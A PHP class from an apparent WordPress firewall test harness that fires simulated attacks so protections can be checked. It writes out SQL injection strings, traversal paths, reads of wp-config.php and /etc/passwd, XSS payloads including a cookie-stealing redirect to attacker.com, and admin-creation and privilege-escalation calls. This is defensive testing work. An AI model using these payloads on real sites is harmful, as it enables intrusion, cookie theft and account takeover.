<?php
if (!defined('ABSPATH')) exit;
require_once(ABSPATH.'wp-admin/includes/user.php' );
if (!class_exists('VulnerabilityAcceptor')) :
	class VulnerabilityAcceptor {
		public static function try_exploit($vuln_id, $params) {
			switch($vuln_id) {
			case 'wp_radar_essential_addon_psswd_reset_test':
				self::wp_radar_essential_addon_psswd_reset_test();
				break;
			case 'wp_radar_update_option_test_1':
				$option_name = 'blogname';
				$option_value = WordpressOpsHelper::getRandomString(6);
				self::wp_radar_update_option_test($option_name, $option_value);
				break;
			case 'wp_radar_update_option_test_2':
				$option_name = 'blogdescription';
				$option_value = WordpressOpsHelper::getRandomString(20);
				self::wp_radar_update_option_test($option_name, $option_value);
				break;
			case 'wp_radar_update_option_test_3':
				$option_name = 'siteurl';
				$option_value = 'https://' . WordpressOpsHelper::getRandomString(6) . '.net';
				self::wp_radar_update_option_test($option_name, $option_value);
				break;
			case 'wp_radar_update_option_test_4':
				$option_name = 'bvAccountsList';
				$option_value = WordpressOpsHelper::getRandomString(6);
				self::wp_radar_update_option_test($option_name, $option_value);
				break;
			case 'wp_radar_sql_injection_test_1':
				$query = 'union select id from hacktable';
				self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_sql_injection_test_2':
				$query = "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')) from hacktable";
				self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_sql_injection_test_3':
				$query = 'select * from wp_options';
				self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_sql_injection_test_4':
				$user_input = "'2' and 1=2 --";
				$query = "SELECT * FROM wp_posts WHERE post_status = $user_input;";
				self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_sql_injection_test_5':
				$query = 'select post_status from wp_posts where ID=1';
				self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_directory_traversal_test_1':
				$path = "../";
				self::wp_radar_directory_traversal_test($path);
				break;
			case 'wp_radar_directory_traversal_test_2':
				$path = "../../../";
				self::wp_radar_directory_traversal_test($path);
				break;
			case 'wp_radar_directory_traversal_test_3':
				$path = "../../";
				self::wp_radar_directory_traversal_test($path);
				break;
			case 'wp_radar_file_inclusion_test_1':
				$path = "./wp-config.php";
				self::wp_radar_file_inclusion_test($path);
				break;
			case 'wp_radar_file_inclusion_test_2':
				$path = "/etc/passwd";
				self::wp_radar_file_inclusion_test($path);
				break;
			case 'wp_radar_file_upload_test_1':
				self::wp_radar_file_upload_test();
				break;
			case 'wp_radar_file_upload_test_2':
				self::wp_radar_file_upload_test();
				break;
			case 'wp_radar_file_upload_test_3':
				self::wp_radar_file_upload_test();
				break;
			case 'wp_radar_file_upload_test_4':
				self::wp_radar_file_upload_test();
				break;
			case 'wp_radar_add_option_test_1':
				$option_name = 'option1';
				$option_value = WordpressOpsHelper::getRandomString(6);
				self::wp_radar_add_option_test($option_name, $option_value);
				break;
			case 'wp_radar_delete_option_test_1':
				$option_name = 'siteurl';
				self::wp_radar_delete_option_test($option_name);
				break;
			case 'wp_radar_delete_option_test_2':
				$option_name = 'default_role';
				self::wp_radar_delete_option_test($option_name);
				break;
			case 'wp_radar_delete_option_test_3':
				$option_name = 'home';
				self::wp_radar_delete_option_test($option_name);
				break;
			case 'wp_radar_create_user_test_1':
				add_action('init', function() {
					$user_login = WordpressOpsHelper::getRandomString(10);
					$user_pass = WordpressOpsHelper::getRandomString(10);
					$user_email = WordpressOpsHelper::getRandomString(6).'@gmail.com';
					$role = 'editor';
					$user_data = array('user_login' => $user_login, 'user_pass' => $user_pass, 'user_email' => $user_email, 'role' => $role);
					self::wp_radar_create_user_test($user_data);
				}, 1000000);
				break;
			case 'wp_radar_create_user_test_2':
				add_action('init', function() {
					$user_login = WordpressOpsHelper::getRandomString(10);
					$user_pass = WordpressOpsHelper::getRandomString(10);
					$user_email = WordpressOpsHelper::getRandomString(6).'@gmail.com';
					$role = 'administrator';
					$user_data = array('user_login' => $user_login, 'user_pass' => $user_pass, 'user_email' => $user_email, 'role' => $role);
					self::wp_radar_create_user_test($user_data);
				}, 1000000);
				break;
			case 'wp_radar_delete_user_test_1':
				add_action('init', function() {
					$user = WordpressOpsHelper::get_wp_user('administrator');
					if ($user) {
						$user_id = $user->ID;
						self::wp_radar_delete_user_test($user_id);
					} else {
						self::wp_radar_skip_test();
					}
				}, 1000000);
				break;
			case 'wp_radar_delete_user_test_2':
				add_action('init', function() {
					$user = WordpressOpsHelper::get_wp_user('subscriber');
					if ($user) {
						$user_id = $user->ID;
						self::wp_radar_delete_user_test($user_id);
					} else {
						self::wp_radar_skip_test();
					}
				}, 1000000);
				break;
			case 'wp_radar_update_user_test_1':
				add_action('init', function() {
					$user_data = WordpressOpsHelper::get_wp_user('administrator');
					if ($user_data) {
						$userdata = array('ID' => $user_data->ID, 'user_email' => WordpressOpsHelper::getRandomString(6).'@gmail.com');
						self::wp_radar_update_user_test($userdata);
					} else {
						self::wp_radar_skip_test();
					}
				}, 1000000);
				break;
			case 'wp_radar_update_user_test_2':
				add_action('init', function() {
					$user_data = WordpressOpsHelper::get_wp_user('administrator');
					if ($user_data) {
						$userdata = array('ID' => $user_data->ID, 'user_pass' => WordpressOpsHelper::getRandomString(10));
						self::wp_radar_update_user_test($userdata);
					} else {
						self::wp_radar_skip_test();
					}
				}, 1000000);
				break;
			case 'wp_radar_delete_post_test_1':
				add_action('init', function() {
					$post = WordpressOpsHelper::get_wp_post();
					if ($post) {
						$post_id = $post->ID;
						self::wp_radar_delete_post_test($post_id);
					} else {
						self::wp_radar_skip_test();
					}
				}, 1000000);
				break;
			case 'wp_radar_update_user_meta_test_1':
				add_action('init', function() {
					$user = WordpressOpsHelper::get_wp_user('administrator');
					if ($user) {
						$user_id = $user->ID;
						$meta_key = WordpressOpsHelper::getDBPrefix() . 'capabilities';
						$meta_value = array('editor', true);
						self::wp_radar_update_user_meta_test($user_id, $meta_key, $meta_value);
					} else {
						self::wp_radar_skip_test();
					}
				}, 1000000);
				break;
			case 'wp_radar_update_user_meta_test_2':
				add_action('init', function() {
					$user = WordpressOpsHelper::get_wp_user('subscriber');
					if ($user) {
						$user_id = $user->ID;
						$meta_key = WordpressOpsHelper::getDBPrefix() . 'capabilities';
						$meta_value = array('administrator' => true);
						self::wp_radar_update_user_meta_test($user_id, $meta_key, $meta_value);
					} else {
						self::wp_radar_skip_test();
					}
				}, 1000000);
				break;
			case 'wp_radar_add_user_meta_test_1':
				add_action('init', function() {
					$user = WordpressOpsHelper::get_wp_user('administrator');
					if ($user) {
						$user_id = $user->ID;
						$meta_key = WordpressOpsHelper::getDBPrefix() . 'capabilities';
						$meta_value = array('administrator' => 1);
						self::wp_radar_add_user_meta_test($user_id, $meta_key, $meta_value);
					} else {
						self::wp_radar_skip_test();
					}
				}, 1000000);
				break;
			case 'wp_radar_cross_site_scripting_test_1':
				$cmd = "<script>alert('1');</script>";
				self::wp_radar_cross_site_scripting_test($cmd);
				break;
			case 'wp_radar_cross_site_scripting_test_2':
				$cmd = "<img src=\"https://attacker.com/evil\" onerror=\"alert('XSS')\">";
				self::wp_radar_cross_site_scripting_test($cmd, true);
				break;
			case 'wp_radar_cross_site_scripting_test_3':
				$cmd = "<a href=\"javascript:alert('XSS')\">Click me</a>";
				self::wp_radar_cross_site_scripting_test($cmd, true);
				break;
			case 'wp_radar_cross_site_scripting_test_4':
				$cmd = "<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>";
				self::wp_radar_cross_site_scripting_test($cmd, true);
				break;
			default:
				die('exploited');
				break;
			}
		}

		public static function wp_radar_sql_injection_test($query) {
			die('exploited');
		}

		public static function wp_radar_essential_addon_psswd_reset_test() {
			add_action('init', array(__CLASS__, 'wp_radar_essential_addon_passwd_reset'));
		}

		public static function wp_radar_essential_addon_passwd_reset() {
			$user = WordpressOpsHelper::get_wp_user('administrator');
			if ($user) {
				add_action('password_reset', array(__CLASS__, 'password_reset_action'), 1000000, 2);
				$new_passwd = WordpressOpsHelper::getRandomString();
				reset_password($user, $new_passwd);
			} else {
				http_response_code(403);
				die('Blocked');
			}
		}

		public static function wp_radar_update_option_test($option_name, $option_value) {
			add_filter('pre_update_option', array(__CLASS__, 'update_option_action'), 1000000, 3);
			if (!update_option($option_name, $option_value)) {
				self::wp_radar_skip_test();
			}
		}

		public static function wp_radar_add_option_test($option_name, $option_value) {
			add_action('add_option', array(__CLASS__, 'add_option_action'), 1000000, 2);
			if (!add_option($option_name, $option_value)) {
				self::wp_radar_skip_test();
			}
		}

		public static function wp_radar_delete_option_test($option_name) {
			add_action('delete_option', array(__CLASS__, 'delete_option_action'), 1000000, 1);
			if (!delete_option($option_name)){
				self::wp_radar_skip_test();
			}
		}

		public static function wp_radar_create_user_test($user_data) {
			add_filter( 'wp_pre_insert_user_data', array(__CLASS__, 'create_user_action'), 1000000, 1);
			wp_insert_user($user_data);
		}

		public static function wp_radar_delete_user_test($user_id) {
			add_action('delete_user', array(__CLASS__, 'delete_user_action'), 1000000, 1);
			wp_delete_user($user_id);
		}

		public static function wp_radar_update_user_test($user_data) {
			add_filter( 'wp_pre_insert_user_data', array(__CLASS__, 'update_user_action'), 1000000, 1);
			if (!is_int(wp_update_user($user_data))) {
				self::wp_radar_skip_test();
      }
		}

		public static function wp_radar_delete_post_test($post_id) {
			add_action('before_delete_post', array(__CLASS__, 'delete_post_action'), 1000000, 1);
			add_filter('pre_delete_attachment', array(__CLASS__, 'delete_post_action'), 1000000, 1);
			add_filter('pre_trash_post', array(__CLASS__, 'delete_post_action'), 1000000, 1);
			wp_delete_post($post_id, true);
		}

		public static function wp_radar_update_user_meta_test($user_id, $meta_key, $meta_value) {
			add_action('update_user_meta', array(__CLASS__, 'update_user_meta_action'), 1000000, 4);
			add_action('add_user_meta', array(__CLASS__, 'add_user_meta_action'), 1000000, 3);
			if (!update_metadata('user', $user_id, $meta_key, $meta_value)) {
				self::wp_radar_skip_test();
			}
		}

		public static function wp_radar_add_user_meta_test($user_id, $meta_key, $meta_value) {
			add_action('add_user_meta', array(__CLASS__, 'add_user_meta_action'), 1000000, 3);
			if (!add_metadata('user', $user_id, $meta_key, $meta_value)) {
				self::wp_radar_skip_test();
			}
		}

		public static function wp_radar_cross_site_scripting_test($cmd) {
			die('exploited');
		}

		public static function wp_radar_directory_traversal_test($path) {
			// $files = array();
			// if ($handle = opendir($path)) {
			// 	while (false !== ($file = readdir($handle))) {
			// 		if ($file != "." && $file != "..") {
			// 			array_push($files, $file);
			// 		}
			// 	}
			// 	closedir($handle);
			// }
			die('exploited');
		}

		public static function wp_radar_file_inclusion_test($path) {
			// if (file_exists($path)) {
			// 	$file_handle = fopen($path, 'r');
			// 	if ($file_handle) {
			// 		fclose($file_handle);
			// 	}
			// }
			die('exploited');
		}

		public static function wp_radar_file_upload_test() {
			die('exploited');
		}

		public static function update_option_action($option_name, $option_value, $old_value) {
			if ($option_value == $old_value) {
				self::wp_radar_skip_test();
			}
			die('exploited');
		}

		public static function password_reset_action($user, $new_pass) {
			die("exploited");
		}

		public static function add_option_action($option_name, $option_value) {
			die('exploited');
		}

		public static function delete_option_action($option_name) {
			die('exploited');
		}

		public static function create_user_action($user_data) {
			die('exploited');
		}

		public static function delete_user_action($user_id) {
			die('exploited');
		}

		public static function update_user_action($user_data) {
			die('exploited');
		}

		public static function delete_post_action($post_id) {
			die('exploited');
		}

		public static function update_user_meta_action($meta_id, $object_id, $meta_key, $meta_value) {
			die('exploited');
		}

		public static function add_user_meta_action($object_id, $meta_key, $meta_value) {
			die('exploited');
		}

		public static function wp_radar_skip_test(){
			http_response_code(422);
			die('Skipped');
		}
	}
endif;
?>